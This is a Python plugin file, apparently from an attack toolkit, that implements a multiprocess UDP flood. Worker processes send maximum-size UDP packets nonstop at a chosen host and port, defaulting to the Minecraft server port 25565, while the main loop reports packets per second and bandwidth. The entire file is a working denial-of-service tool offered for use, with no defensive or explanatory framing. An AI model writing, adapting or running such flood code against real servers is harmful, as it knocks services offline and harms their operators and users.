from plugins.common import *
import socket
import multiprocessing
import time
import os

PAYLOAD = b'\xff' * 65507  # UDP max payload

def worker(host, port, count, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (host, port)
    i = 0
    while not stop_flag.value:
        try:
            sock.sendto(PAYLOAD, addr)
            count.value += 1
            i += 1
        except:
            pass

def udpflood(server, procs):
    try:
        if ':' in server:
            host, port = server.split(':')
        else:
            host, port = server, '25565'

        port = int(port)
        procs = int(procs)

        logging.info(f'Starting UDP flood -> {host}:{port} | {procs} processes | Ctrl+C to stop')

        stop_flag = multiprocessing.Value('b', 0)
        counts = [multiprocessing.Value('i', 0) for _ in range(procs)]

        pool = []
        for i in range(procs):
            p = multiprocessing.Process(target=worker, args=(host, port, counts[i], stop_flag), daemon=True)
            p.start()
            pool.append(p)

        prev = 0
        while True:
            time.sleep(0.5)
            total = sum(c.value for c in counts)
            diff = total - prev
            prev = total
            mbps = (diff * len(PAYLOAD) * 8) / 1_000_000
            logging.info(f'Packets: {total} | {diff} pps | ~{mbps:.1f} Mbps → {host}')

    except KeyboardInterrupt:
        stop_flag.value = 1
        for p in pool:
            p.terminate()
        total = sum(c.value for c in counts)
        logging.success(f'Stopped | Total: {total} packets')
    except Exception as e:
        logging.error(e)

if __name__ == '__main__':
    multiprocessing.freeze_support()